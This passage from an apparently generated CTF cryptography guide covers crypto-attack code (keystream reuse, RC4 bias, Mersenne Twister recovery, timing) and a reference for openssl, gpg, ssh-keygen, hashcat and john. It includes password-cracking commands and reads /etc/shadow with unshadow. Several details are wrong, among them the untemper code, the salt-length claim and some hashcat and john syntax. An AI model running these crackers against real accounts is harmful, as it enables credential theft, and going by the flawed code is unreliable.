    Send points not on the actual curve to extract private key bits
    Exploits implementations that don't validate points
    """
    return {
        'vulnerability': 'Missing point validation',
        'attack': 'Send point on curve with weak order',
        'result': 'Private key revealed through subgroup confinement',
        'mitigation': 'Always validate points are on curve',
        'example_curves': [
            'Curve25519 implementations without point validation',
            'Custom ECC implementations'
        ]
    }

# Small subgroup attack
def ecc_small_subgroup_attack_demo():
    """
    [Inference] Conceptual demonstration of small subgroup attack
    """
    attack_steps = [
        '1. Find curve with small subgroup order h',
        '2. Generate point P with order h',
        '3. Send P to victim, receive k*P',
        '4. Solve discrete log in small subgroup',
        '5. Repeat with different small orders',
        '6. Use CRT to recover full private key'
    ]
    
    return {
        'steps': attack_steps,
        'vulnerable_curves': 'Curves with large cofactor',
        'safe_curves': 'Curve25519 (cofactor = 8 but protected)',
        'tool': 'ecgen - generate weak curves'
    }
```

**MOV Attack (Weil/Tate Pairing)**

```bash
# Requires SageMath for pairing-based attacks
sage <<EOF
# Define elliptic curve
p = 12345678901234567890123456789
E = EllipticCurve(GF(p), [a, b])

# Check embedding degree
k = E.embedding_degree()
print(f"Embedding degree: {k}")

if k < 20:
    print("Vulnerable to MOV attack")
    # Transfer ECDLP to finite field DLP
else:
    print("Not vulnerable to MOV attack")
EOF
```

#### Stream Cipher Attacks

**Two-Time Pad (Keystream Reuse)**

```python
def two_time_pad_attack(ciphertexts):
    """
    Break XOR cipher when keystream is reused
    """
    # XOR all pairs of ciphertexts
    xor_results = []
    for i in range(len(ciphertexts)):
        for j in range(i + 1, len(ciphertexts)):
            xor_result = bytes([a ^ b for a, b in zip(ciphertexts[i], ciphertexts[j])])
            xor_results.append((i, j, xor_result))
    
    # Frequency analysis on XORed plaintexts
    def score_text(data):
        """Score based on English letter frequency"""
        score = 0
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII
                score += 1
            if byte in b'etaoinshrdlu ETAOINSHRDLU':
                score += 2
        return score
    
    # Try to guess space positions (common in English)
    def find_spaces(xor_data):
        """Space XOR letter gives letter XOR 0x20"""
        potential_spaces = []
        for i, byte in enumerate(xor_data):
            # If xor is a letter, one plaintext likely has space
            if 65 <= byte <= 90 or 97 <= byte <= 122:
                potential_spaces.append(i)
        return potential_spaces
    
    results = []
    for i, j, xor_data in xor_results:
        spaces = find_spaces(xor_data)
        score = score_text(xor_data)
        results.append({
            'ct_indices': (i, j),
            'score': score,
            'potential_spaces': spaces[:10],  # First 10
            'xor_preview': xor_data[:50].hex()
        })
    
    return sorted(results, key=lambda x: x['score'], reverse=True)

# Crib dragging
def crib_drag(ciphertext, crib_list):
    """
    Drag known plaintext (crib) across ciphertext to find position
    """
    results = []
    
    for crib in crib_list:
        crib_bytes = crib.encode()
        
        for position in range(len(ciphertext) - len(crib_bytes)):
            # XOR crib with ciphertext at this position
            keystream_guess = bytes([c ^ p for c, p in zip(
                ciphertext[position:position+len(crib_bytes)],
                crib_bytes
            )])
            
            # Try to decrypt rest of message with this keystream
            if position + len(keystream_guess) < len(ciphertext):
                decrypted = bytes([c ^ k for c, k in zip(
                    ciphertext[position:position+len(keystream_guess)],
                    keystream_guess
                )])
                
                # Check if result looks like text
                if all(32 <= b <= 126 for b in decrypted):
                    results.append({
                        'crib': crib,
                        'position': position,
                        'keystream': keystream_guess.hex(),
                        'decrypted': decrypted.decode('ascii', errors='ignore')
                    })
    
    return results
```

**RC4 Keystream Bias Exploitation**

```python
def rc4_bias_analysis(ciphertexts, position=1):
    """
    Exploit known biases in RC4 keystream
    Position 1 (second byte) has bias toward 0
    """
    if position >= min(len(ct) for ct in ciphertexts):
        return None
    
    # Collect bytes at specific position
    bytes_at_position = [ct[position] for ct in ciphertexts]
    
    # Count frequency
    from collections import Counter
    frequency = Counter(bytes_at_position)
    
    # Expected most common XOR with 0 (since keystream byte 1 biased to 0)
    most_common_ct_byte = frequency.most_common(1)[0][0]
    
    # Guess plaintext byte at this position is most_common XOR 0
    guessed_keystream_byte = 0
    guessed_plaintext_byte = most_common_ct_byte ^ guessed_keystream_byte
    
    return {
        'position': position,
        'most_common_ciphertext_byte': hex(most_common_ct_byte),
        'frequency_count': frequency.most_common(5),
        'guessed_plaintext': chr(guessed_plaintext_byte) if 32 <= guessed_plaintext_byte <= 126 else None,
        'bias_strength': frequency[most_common_ct_byte] / len(ciphertexts)
    }

# PRNG state recovery from output
def crack_mt19937_from_output(outputs):
    """
    Recover Mersenne Twister state from 624 consecutive outputs
    """
    if len(outputs) < 624:
        return None
    
    # Untemper each output to get internal state
    state = [mt19937_untemper(y) for y in outputs[:624]]
    
    return {
        'state_recovered': True,
        'state_length': len(state),
        'note': 'Can now predict all future outputs'
    }

def mt19937_untemper(y):
    """
    Reverse MT19937 tempering operations
    """
    # Reverse y ^= (y >> 18)
    y = y ^ (y >> 18)
    
    # Reverse y ^= ((y << 15) & 0xefc60000)
    y = y ^ ((y << 15) & 0xefc60000)
    
    # Reverse y ^= ((y << 7) & 0x9d2c5680) - need to apply 4 times
    for _ in range(4):
        y = y ^ ((y << 7) & 0x9d2c5680)
    
    # Reverse y ^= (y >> 11) - need to apply twice
    y = y ^ (y >> 11)
    y = y ^ (y >> 11)
    
    return y & 0xffffffff
```

#### Timing Attack Implementations

**RSA Timing Attack**

```python
import time

def rsa_timing_attack_oracle(ciphertext, measure_function):
    """
    Measure decryption time to leak private key bits
    [Inference] Simplified concept - real attacks need statistical analysis
    """
    timings = []
    
    # Collect timing samples
    for _ in range(1000):
        start = time.perf_counter()
        measure_function(ciphertext)
        end = time.perf_counter()
        timings.append(end - start)
    
    import statistics
    return {
        'mean': statistics.mean(timings),
        'stdev': statistics.stdev(timings),
        'min': min(timings),
        'max': max(timings),
        'note': 'Analyze timing variations to infer key bits'
    }

# Constant-time comparison
def insecure_compare(a, b):
    """INSECURE: Leaks information through early return"""
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False  # Early return leaks position
    return True

def secure_compare(a, b):
    """Secure: Constant-time comparison"""
    if len(a) != len(b):
        return False
    
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y  # Always check all bytes
    
    return result == 0
```

**Cache Timing Attacks**

```python
def cache_timing_attack_concept():
    """
    [Inference] Demonstrates attack principle
    Actual implementation requires low-level CPU access
    """
    return {
        'attack_type': 'Cache Timing Side Channel',
        'targets': ['AES T-table implementations', 'RSA modular exponentiation'],
        'techniques': {
            'Flush+Reload': 'clflush instruction + timing',
            'Prime+Probe': 'Fill cache sets, measure eviction',
            'Evict+Time': 'Evict specific lines, time access'
        },
        'tools': ['Mastik', 'FLUSH+RELOAD toolkit'],
        'mitigations': ['Constant-time algorithms', 'Cache-resistant implementations'],
        'note': '[Unverified] Success depends on CPU architecture and system noise'
    }
```

### Cipher Weakness Summary Table

```python
def generate_weakness_database():
    """
    Comprehensive cipher weakness reference
    """
    return {
        'symmetric_ciphers': {
            'DES': {
                'key_size': 56,
                'status': 'BROKEN',
                'attacks': ['Brute force (practical)', 'Weak keys', 'Linear cryptanalysis'],
                'tools': ['John the Ripper', 'hashcat'],
                'replacement': 'AES'
            },
            '3DES': {
                'key_size': 112 ,  # effective for 2-key
                'status': 'DEPRECATED',
                'attacks': ['Sweet32 (birthday)', 'Meet-in-the-middle'],
                'block_size': 64,
                'replacement': 'AES'
            },
            'RC4': {
                'type': 'stream',
                'status': 'BROKEN',
                'attacks': ['Keystream bias', 'Fluhrer-Mantin-Shamir', 'RC4-NOMORE'],
                'tools': ['rc4_crack'],
                'replacement': 'ChaCha20'
            },
            'Blowfish': {
                'block_size': 64,
                'status': 'DEPRECATED',
                'attacks': ['Sweet32', 'Weak key classes'],
                'replacement': 'AES or Twofish'
            }
        },
        'hash_functions': {
            'MD5': {
                'output_bits': 128,
                'status': 'BROKEN',
                'attacks': ['Collision (practical)', 'Preimage (theoretical)', 'Length extension'],
                'tools': ['HashClash', 'md5_fastcoll'],
                'replacement': 'SHA-256'
            },
            'SHA-1': {
                'output_bits': 160,
                'status': 'DEPRECATED',
                'attacks': ['Collision (practical 2017)', 'Length extension'],
                'tools': ['sha1collider', 'shattered'],
                'replacement': 'SHA-256'
            }
        },
        'asymmetric_ciphers': {
            'RSA': {
                'weak_conditions': [
                    'e < 65537',
                    'd < n^0.25',
                    'p and q close together',
                    'Common modulus',
                    'p-1 or q-1 smooth'
                ],
                'attacks': [
                    'Small e attack',
                    'Wiener attack',
                    'Fermat factorization',
                    'Pollard p-1',
                    'Hastad broadcast'
                ],
                'minimum_key_size': 2048
            },
            'DSA': {
                'weak_conditions': ['Nonce reuse', 'Weak PRNG', 'Short q'],
                'attacks': ['Nonce recovery', 'Lattice attacks'],
                'minimum_param_size': {'p': 2048, 'q': 256}
            },
            'ECDSA': {
                'weak_conditions': ['Nonce reuse', 'Nonce bias', 'Invalid curve'],
                'attacks': ['Biased nonce attack', 'Invalid curve attack'],
                'safe_curves': ['secp256r1', 'Curve25519', 'secp256k1']
            }
        },
        'modes_of_operation': {
            'ECB': {
                'status': 'INSECURE',
                'attacks': ['Block shuffling', 'Plaintext leakage', 'Pattern detection'],
                'note': 'Never use for anything'
            },
            'CBC': {
                'status': 'DEPRECATED',
                'attacks': ['Padding oracle', 'IV manipulation', 'Bit flipping'],
                'note': 'Requires careful padding validation'
            },
            'CTR': {
                'status': 'SECURE',
                'weak_conditions': ['Nonce reuse'],
                'attacks': ['Keystream reuse if nonce repeated']
            },
            'GCM': {
                'status': 'SECURE',
                'weak_conditions': ['Nonce reuse (catastrophic)', 'Short tags'],
                'note': 'Never reuse nonce with same key'
            }
        }
    }

# Print formatted weakness report
def print_cipher_analysis(cipher_name, database):
    """Generate CTF-ready cipher analysis"""
    for category, ciphers in database.items():
        if cipher_name in ciphers:
            info = ciphers[cipher_name]
            print(f"\n=== {cipher_name} Analysis ===")
            for key, value in info.items():
                print(f"{key}: {value}")
            return
    print(f"Cipher {cipher_name} not found in database")
```

**Important CTF Resources:**

- **RsaCtfTool**: `git clone https://github.com/Ganapati/RsaCtfTool.git` - Automated RSA attack tool
- **HashClash**: MD5 collision generation framework
- **PyCryptodome**: `pip install pycryptodome` - Comprehensive crypto library
- **SageMath**: Advanced mathematical attacks (ECC, polynomial attacks)
- **John the Ripper**: Hash cracking with custom rules
- **Hashcat**: GPU-accelerated hash cracking

**Disclaimer:** [Unverified] Attack success rates vary significantly based on key parameters, implementation details, and available computational resources. The examples demonstrate attack principles; actual CTF challenges may require adaptation and combination of multiple techniques.

---

# KALI LINUX TOOL ECOSYSTEM

## Pre-installed Cryptographic Tools

### `openssl`

OpenSSL is a cryptographic toolkit providing symmetric encryption, asymmetric encryption, hashing, certificate management, and SSL/TLS protocol operations. It's fundamental for CTF cryptography challenges involving encryption, decryption, and protocol analysis.

##### Symmetric Encryption

Encrypt plaintext with AES-256-CBC:

```bash
openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin -S $(openssl rand -hex 8) -md sha256
```

The `-S` option specifies a salt (8 hex characters = 4 bytes); `$(openssl rand -hex 8)` generates random salt. `-md sha256` specifies the key derivation function. Prompt for password interactively:

```bash
openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin -md sha256
```

OpenSSL prompts for a password. Avoid storing passwords in command history.

Decrypt:

```bash
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -md sha256
```

The `-d` flag toggles decryption mode. Enter the same password used during encryption.

Specify key and IV directly (useful for CTF scenarios with known credentials):

```bash
openssl enc -aes-256-cbc -K 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef -iv 0123456789abcdef -in plaintext.txt -out encrypted.bin -nopad
```

`-K` specifies key as hex (32 bytes for AES-256). `-iv` specifies initialization vector as hex (16 bytes). `-nopad` disables PKCS#7 padding (use only if plaintext length is multiple of 16 bytes).

Other cipher algorithms:

```bash
openssl enc -aes-128-ecb -in plaintext.txt -out encrypted.bin
openssl enc -des3-cbc -in plaintext.txt -out encrypted.bin
openssl enc -bf-cbc -in plaintext.txt -out encrypted.bin
```

List available ciphers:

```bash
openssl enc -list
```

##### Asymmetric Encryption (RSA)

Generate RSA key pair (2048-bit):

```bash
openssl genrsa -out private.pem 2048
```

Extract public key:

```bash
openssl rsa -in private.pem -pubout -out public.pem
```

Encrypt plaintext with public key:

```bash
openssl rsautl -encrypt -inkey public.pem -pubin -in plaintext.txt -out encrypted.bin
```

Decrypt with private key:

```bash
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

For large files (RSA cannot directly encrypt files larger than key size minus padding), use hybrid encryption:

```bash
# Generate random symmetric key
openssl rand 32 > symmetric.key

# Encrypt file with symmetric key
openssl enc -aes-256-cbc -in largefile.txt -out largefile.enc -K $(xxd -p -l 32 symmetric.key) -S 0000000000000000 -md sha256 -nopad

# Encrypt symmetric key with RSA public key
openssl rsautl -encrypt -inkey public.pem -pubin -in symmetric.key -out symmetric.key.enc

# Decrypt (reverse process)
openssl rsautl -decrypt -inkey private.pem -in symmetric.key.enc -out symmetric.key.dec
openssl enc -aes-256-cbc -d -in largefile.enc -out largefile.dec -K $(xxd -p -l 32 symmetric.key.dec) -S 0000000000000000 -md sha256 -nopad
```

##### Hashing and Message Digests

Generate hash digests:

```bash
openssl dgst -sha256 file.txt
openssl dgst -md5 file.txt
openssl dgst -sha512 file.txt
```

Output format: `SHA2-256(file.txt)= abcd1234...`

For password hashing (bcrypt-like alternatives use `crypt`):

```bash
openssl passwd -crypt plaintext_password
openssl passwd -1 plaintext_password
```

`-crypt` uses traditional DES-based crypt (legacy). `-1` uses MD5-based hashing (also legacy, not recommended for new systems). For bcrypt:

```bash
openssl passwd -6 plaintext_password
```

The `-6` option uses SHA-512-based crypt (glibc extension).

HMAC generation:

```bash
openssl dgst -sha256 -hmac "secret_key" file.txt
echo -n "message" | openssl dgst -sha256 -hmac "secret_key"
```

Verify HMAC by recomputing:

```bash
known_hmac="abcd1234..."
computed_hmac=$(echo -n "message" | openssl dgst -sha256 -hmac "secret_key" | awk '{print $2}')
if [ "$known_hmac" = "$computed_hmac" ]; then echo "HMAC valid"; fi
```

##### Certificate Operations

Generate self-signed certificate:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

`-x509` creates self-signed certificate. `-newkey rsa:2048` generates 2048-bit RSA key. `-days 365` sets validity period. `-nodes` prevents password protection of the key file.

View certificate contents:

```bash
openssl x509 -in cert.pem -text -noout
```

Extract specific fields:

```bash
openssl x509 -in cert.pem -noout -subject
openssl x509 -in cert.pem -noout -issuer
openssl x509 -in cert.pem -noout -dates
```

Extract public key from certificate:

```bash
openssl x509 -in cert.pem -pubkey -noout > cert_public.pem
```

##### SSL/TLS Protocol Analysis

Connect to SSL/TLS server and display certificate chain:

```bash
openssl s_client -connect example.com:443
```

This opens interactive SSL/TLS session. Type HTTP requests (e.g., `GET / HTTP/1.1`) to interact. Press Ctrl+C to exit. For non-interactive certificate inspection:

```bash
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout
```

Extract certificate chain:

```bash
echo | openssl s_client -connect example.com:443 -showcerts 2>/dev/null | grep -A 30 "BEGIN CERTIFICATE"
```

Test for specific SSL/TLS vulnerabilities:

```bash
openssl s_client -connect example.com:443 -ssl3
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -tls1_2
```

Attempt connection with older protocol versions to detect legacy protocol support.

##### Key Format Conversion

Convert PEM private key to PKCS#8 format:

```bash
openssl pkcs8 -topk8 -in private.pem -out private_pkcs8.pem -nocrypt
```

`-nocrypt` skips password protection. Remove for password-protected output.

Convert PKCS#12 (`.p12`, `.pfx`) to PEM:

```bash
openssl pkcs12 -in certificate.p12 -out certificate.pem -nodes
```

`-nodes` outputs unencrypted private key. Separate private key and certificate:

```bash
openssl pkcs12 -in certificate.p12 -out private_key.pem -nocerts -nodes
openssl pkcs12 -in certificate.p12 -out certificate_only.pem -nokeys
```

##### Random Data Generation

Generate random bytes for keys, IVs, or salts:

```bash
openssl rand 32
openssl rand -hex 32
openssl rand -base64 32
```

Default outputs binary. `-hex` outputs hexadecimal. `-base64` outputs base64-encoded data.

Generate random primes (useful for RSA key generation understanding):

```bash
openssl prime 2048
```

Generates a random 2048-bit prime number.

##### Elliptic Curve Cryptography

Generate EC key pair:

```bash
openssl ecparam -genkey -name prime256v1 -out ec_private.pem
```

`-name prime256v1` specifies the curve (P-256). Other curves: `secp384r1`, `secp521r1`. Extract public key:

```bash
openssl ec -in ec_private.pem -pubout -out ec_public.pem
```

Sign data with EC private key:

```bash
openssl dgst -sha256 -sign ec_private.pem -out signature.bin file.txt
```

Verify signature with EC public key:

```bash
openssl dgst -sha256 -verify ec_public.pem -signature signature.bin file.txt
```

Output: "Verified OK" or "Verification Failure".

### `gpg`

GPG (GNU Privacy Guard) provides encryption, decryption, and digital signing using OpenPGP standard. It's commonly used in CTF challenges for key management and cryptographic operations.

##### Key Generation and Management

Generate new GPG key pair:

```bash
gpg --gen-key
```

Interactive menu prompts for key type (RSA recommended), key size (4096-bit for strength), validity period, name, and email. Alternative batch mode:

```bash
gpg --batch --gen-key <<EOF
%echo Generating key
Key-Type: RSA
Key-Length: 4096
Name-Real: CTF Player
Name-Email: ctf@example.com
Expire-Date: 0
%no-ask-passphrase
%echo done
EOF
```

List keys in keyring:

```bash
gpg --list-keys
gpg --list-secret-keys
```

Display full key fingerprints:

```bash
gpg --fingerprint
```

Export public key:

```bash
gpg -a --export user_email@example.com > public_key.asc
```

`-a` outputs ASCII-armored format (base64-encoded PEM). Export without `-a` produces binary.

Import public key:

```bash
gpg --import public_key.asc
```

Delete key:

```bash
gpg --delete-key user_email@example.com
gpg --delete-secret-key user_email@example.com
```

Trust key:

```bash
gpg --edit-key user_email@example.com
# Interactive menu: trust, quit
```

##### Encryption and Decryption

Encrypt file with recipient's public key:

```bash
gpg -e -r recipient@example.com plaintext.txt
```

Output: `plaintext.txt.gpg`. Encrypt for multiple recipients:

```bash
gpg -e -r recipient1@example.com -r recipient2@example.com plaintext.txt
```

Symmetric encryption (password-based, no key pair required):

```bash
gpg -c plaintext.txt
```

Prompts for passphrase. Output: `plaintext.txt.gpg`.

Decrypt:

```bash
gpg -d plaintext.txt.gpg
```

Output goes to stdout by default. Redirect to file:

```bash
gpg -d -o decrypted.txt plaintext.txt.gpg
```

Decrypt without passphrase prompt (if private key is not password-protected, rare):

```bash
gpg --no-symkey-cache -d plaintext.txt.gpg
```

##### Digital Signatures

Sign file with private key:

```bash
gpg -s plaintext.txt
```

Output: `plaintext.txt.gpg` (binary signature). ASCII-armored signature:

```bash
gpg -a -s plaintext.txt
```

Output: `plaintext.txt.asc`. Create detached signature (separate from content):

```bash
gpg -a -b plaintext.txt
```

Output: `plaintext.txt.asc` (signature only), original file unchanged.

Verify signature:

```bash
gpg --verify plaintext.txt.asc plaintext.txt
```

Or with combined signature:

```bash
gpg --verify plaintext.txt.gpg
```

Output: "Good signature from..." or "Bad signature from...".

##### Keyserver Operations

Search for public keys on keyserver:

```bash
gpg --search-keys user@example.com
```

Interactive menu displays matching keys for import.

Upload public key to keyserver:

```bash
gpg --send-keys key_id
```

Retrieve key from keyserver:

```bash
gpg --recv-keys key_id
```

[Inference] In CTF scenarios with network-isolated environments, keyserver operations fail. Distribute keys via files instead.

##### Batch Processing

Decrypt multiple files:

```bash
for file in *.gpg; do
  gpg -d -o "${file%.gpg}" "$file"
done
```

This loop decrypts all `.gpg` files in current directory, removing `.gpg` extension from output filenames.

Encrypt directory contents:

```bash
tar -czf - directory/ | gpg -e -r recipient@example.com > directory.tar.gz.gpg
```

Pipes compressed tar archive through GPG encryption.

### `ssh-keygen`

SSH-keygen generates, manages, and converts SSH key pairs used for secure shell authentication and other cryptographic operations. It's essential for CTF challenges involving SSH protocol analysis and key extraction.

##### Key Generation

Generate RSA key pair (3072-bit recommended for modern security):

```bash
ssh-keygen -t rsa -b 3072 -f ~/.ssh/id_rsa -N ""
```

`-t rsa` specifies RSA algorithm. `-b 3072` sets 3072-bit key size. `-f` specifies output path. `-N ""` sets empty passphrase (risky in production, acceptable for CTF).

Generate ED25519 key pair (modern, smaller, faster):

```bash
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
```

ED25519 keys are 256-bit, providing equivalent strength to 3072-bit RSA with better performance.

Generate ECDSA key pair:

```bash
ssh-keygen -t ecdsa -b 521 -f ~/.ssh/id_ecdsa -N ""
```

`-b 521` specifies P-521 curve. Also valid: `256` (P-256), `384` (P-384).

##### Key Format Conversion

Convert OpenSSH private key to PEM format (for OpenSSL compatibility):

```bash
ssh-keygen -p -N "" -m pem -f ~/.ssh/id_rsa
```

`-p` prompts for current passphrase (none in this case with `-N ""`). `-m pem` converts to PEM format. `-f` specifies key file.

Convert to PKCS8 format:

```bash
ssh-keygen -p -N "" -m pkcs8 -f ~/.ssh/id_rsa
```

Extract public key from private key:

```bash
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
```

`-y` outputs public key in OpenSSH format.

Convert OpenSSH public key to PEM (for OpenSSL operations):

```bash
ssh-keygen -f ~/.ssh/id_rsa.pub -e -m pem > ~/.ssh/id_rsa_public.pem
```

`-e` exports public key. `-m pem` specifies PEM format. Without `-m`, outputs PKCS#1 format.

##### Key Fingerprinting and Validation

Display key fingerprint:

```bash
ssh-keygen -l -f ~/.ssh/id_rsa.pub
```

Output: `3072 SHA256:abcd1234...== user@host (RSA)`

Change fingerprint format (MD5 for compatibility with older systems):

```bash
ssh-keygen -l -E md5 -f ~/.ssh/id_rsa.pub
```

Output: `3072 MD5:ab:cd:12:34:...== (RSA)`

Validate key:

```bash
ssh-keygen -l -f ~/.ssh/id_rsa
```

If key is corrupted, ssh-keygen returns error. Valid keys display fingerprint.

##### Passphrase Management

Change key passphrase:

```bash
ssh-keygen -p -f ~/.ssh/id_rsa
```

Prompts for old passphrase, then new passphrase.

Remove passphrase (convert to unencrypted key):

```bash
ssh-keygen -p -N "" -f ~/.ssh/id_rsa
```

`-N ""` sets new passphrase to empty. Prompts for current passphrase first.

[Unverified] In CTF scenarios, CTF organizers may provide private keys with unknown passphrases. Brute-forcing SSH key passphrases is computationally expensive (hundreds of iterations per attempt). This is typically not viable within CTF time constraints.

##### Key Comments and Metadata

Change key comment (email or identifier):

```bash
ssh-keygen -c -f ~/.ssh/id_rsa -C "new_comment@example.com"
```

`-c` modifies comment. `-C` specifies new comment. Comments are metadata only and don't affect cryptographic operations.

View key details including comment:

```bash
ssh-keygen -l -f ~/.ssh/id_rsa.pub
```

##### Randomart Visualization

Generate ASCII art fingerprint visualization:

```bash
ssh-keygen -l -v -f ~/.ssh/id_rsa.pub
```

`-v` enables verbose output, displaying randomart. Randomart provides visual key fingerprint for comparison (humans more easily detect visual anomalies than hex strings).

Example randomart:

```
+---[RSA 3072]----+
|      .o.        |
|       .o+       |
|      o.+o.      |
|     o.o+o o.    |
|    . .+S..o .   |
|     E + +....   |
|      . = o.+.   |
|         o.o+.   |
|          .. o+  |
+----[SHA256]-----+
```

##### Batch Key Generation

Generate multiple key pairs for testing:

```bash
for i in {1..5}; do
  ssh-keygen -t rsa -b 2048 -f ~/.ssh/test_key_$i -N ""
done
```

Creates test_key_1 through test_key_5. Useful for simulating multi-user SSH scenarios in CTF challenges.

### `hashcat`

Hashcat is a GPU-accelerated password cracking tool supporting 300+ hash types. It's critical for CTF challenges involving hash extraction and brute-force attack scenarios.

##### Hash Type Identification

Identify hash type:

```bash
hashcat -h | grep -i "md5"
hashcat -h | grep -i "sha256"
```

Common hash modes:

- 0: MD5
- 100: SHA1
- 1400: SHA2-256
- 1700: SHA2-512
- 3200: bcrypt
- 5500: NetNTLMv2
- 13100: Kerberos 5 TGT

##### Basic Dictionary Attack

Crack password hash with wordlist:

```bash
hashcat -m 0 hash.txt wordlist.txt
```

`-m 0` specifies MD5 mode. `hash.txt` contains hash (one per line). `wordlist.txt` is dictionary file. Output displays cracked passwords:

```
hash.txt:password123 [CRACKED]
```

Rules-based attack (modify dictionary entries):

```bash
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
```

`-r` applies rule file (modify, append, prepend characters). Hashcat includes built-in rules: `best64.rule`, `hybrid.rule`, `dive.rule`.

##### Brute Force Attack

Brute force attack with charset:

```bash
hashcat -m 0 hash.txt -a 3 -1 ?l?u?d?s ?1?1?1?1?1?1?1?1
```

`-a 3` specifies brute force mode. `-1` defines custom charset (lowercase, uppercase, digits, special). `?1?1?1?1?1?1?1?1` generates all 8-character combinations from custom charset.

Standard charsets:

- `?l`: Lowercase letters (a-z)
- `?u`: Uppercase letters (A-Z)
- `?d`: Digits (0-9)
- `?s`: Special characters (!@#$%^&*)

Example: 6-character alphanumeric:

```bash
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l
```

Incremental length attack (try 1-8 character passwords):

```bash
hashcat -m 0 hash.txt -a 3 ?l -i --increment-max 8
```

`-i` enables increment mode. `--increment-max 8` sets maximum length.

##### GPU and Performance Optimization

List available GPUs:

```bash
hashcat -I
```

Specify GPU device:

```bash
hashcat -d 1,2 -m 0 hash.txt wordlist.txt
```

`-d 1,2` uses GPUs 1 and 2. Improves performance for large hash sets.

Optimize performance:

```bash
hashcat -w 3 -m 0 hash.txt wordlist.txt
```

`-w` sets workload profile (1=low, 2=medium, 3=high). Higher values use more GPU memory and compute but may timeout.

Session management:

```bash
hashcat --session mysession -m 0 hash.txt wordlist.txt
```

`--session` names the session. Resume:

```bash
hashcat --session mysession --restore
```

##### Hybrid Attacks

Combine wordlist and brute force:

```bash
hashcat -m 0 hash.txt -a 6 wordlist.txt ?d?d
```

`-a 6` is wordlist + mask mode. Appends 2 digits to each dictionary word.

Prepend brute force:

```bash
hashcat -m 0 hash.txt -a 7 ?u wordlist.txt
```

`-a 7` is mask + wordlist mode. Prepends uppercase letter to each dictionary word.

##### Mask Files

Create reusable mask for complex patterns:

```bash
echo "?l?l?l?l?d?d?d?d" > mask.txt
hashcat -m 0 hash.txt -a 3 mask.txt
```

Multi-mask attack (try multiple masks):

```bash
hashcat -m 0 hash.txt -a 3 -x mask1.txt -x mask2.txt
```

##### Output and Outfile Options

Save cracked passwords to file:

```bash
hashcat -m 0 hash.txt wordlist.txt -o cracked.txt
```

Display results in different format:

```bash
hashcat -m 0 hash.txt wordlist.txt --outfile-format=3
```

Formats: 1=hash:password, 2=password only, 3=hash:password with hash type.

##### Advanced Hash Scenarios

Multiple hash types in single file:

```bash
hashcat -m 0,100 hashes.txt wordlist.txt
```

`-m 0,100` attempts both MD5 and SHA1 modes. Hashcat auto-detects applicable hashes.

Salted hash cracking (bcrypt, scrypt):

```bash
hashcat -m 3200 bcrypt_hashes.txt wordlist.txt
```

Hashcat automatically handles salt extraction from bcrypt format.

LM hash cracking (Windows legacy):

```bash
hashcat -m 3000 lm_hashes.txt wordlist.txt
```

LM hashes are case-insensitive and split into 7-character chunks, making brute force faster.

NTLM hash cracking (Windows modern):

```bash
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
```

### `john`

John the Ripper is a password cracking tool emphasizing speed and flexibility. It supports diverse hash formats and attack modes, complementing hashcat in CTF scenarios.

##### Hash Type Recognition

John auto-detects hash type:

```bash
john hashes.txt
```

John analyzes format and applies appropriate cracking method. List supported formats:

```bash
john --list=formats
john --list=formats | grep -i md5
```

Specify hash type explicitly:

```bash
john --format=md5 hashes.txt
john --format=bcrypt hashes.txt
john --format=ntlm hashes.txt
```

##### Dictionary Attack

Crack hashes with wordlist:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Progress displays in-terminal. Stop with Ctrl+C and resume:

```bash
john --restore
```

`--restore` resumes previous session from saved state file.

Custom wordlist:

```bash
john hashes.txt --wordlist=custom.txt
```

##### Single Crack Mode

Apply simple mangling rules to username:

```bash
john --single hashes.txt
```

`--single` mode uses default rules (uppercase first letter, reverse, append numbers). Effective for hashes with known usernames.

Combine with wordlist:

```bash
john --wordlist=passwords.txt --single hashes.txt
```

##### Incremental Mode (Brute Force)

Brute force with character set:

```bash
john --incremental=digits hashes.txt
```

Predefined charsets: `digits`, `loweralpha`, `uperalpha`, `alpha`, `lanman`, `alnum`, `all`.

Create custom incremental mode (in john.conf):

```
[Incremental:Custom]
File = /path/to/charset
MinLen = 4
MaxLen = 8
CharCount = 62
```

Then:

```bash
john --incremental=Custom hashes.txt
```

##### External Mode Scripting

Write custom rule in C-like syntax:

```bash
cat > custom.rules <<EOF
// Double each character
[0-9]
>!X"$0" X"$0"
EOF

john hashes.txt --wordlist=pass.txt --rules=custom.rules
```

[Inference] Writing efficient external mode scripts requires understanding John's proprietary syntax. Documentation is sparse, making this advanced technique difficult to master within CTF timeframes.

##### Combining Multiple Wordlists

Process multiple wordlists sequentially:

```bash
john hashes.txt --wordlist=wordlist1.txt --wordlist=wordlist2.txt
```

Or concatenate before running:

```bash
cat wordlist1.txt wordlist2.txt > combined.txt
john hashes.txt --wordlist=combined.txt
```

##### Session Management

Named session:

```bash
john --session=ctf_session hashes.txt
```

Resume:

```bash
john --session=ctf_session --restore
```

View status:

```bash
john --session=ctf_session --status
```

##### Format-Specific Operations

Extract hashes from system files:

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

`unshadow` merges passwd and shadow files into format John accepts.

Crack Windows NTLM hashes:

```bash
john --format=nt hashes.txt --wordlist=rockyou.txt
```

Crack Kerberos 5 TGT:

```bash
john --format=krb5tgs hashes.txt --wordlist=passwords.txt
```

Crack SSH key passphrase:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=passwords.txt
```

`ssh2john` converts SSH key format for John processing.

##### Optimized Performance

Multi-threaded cracking:

```bash
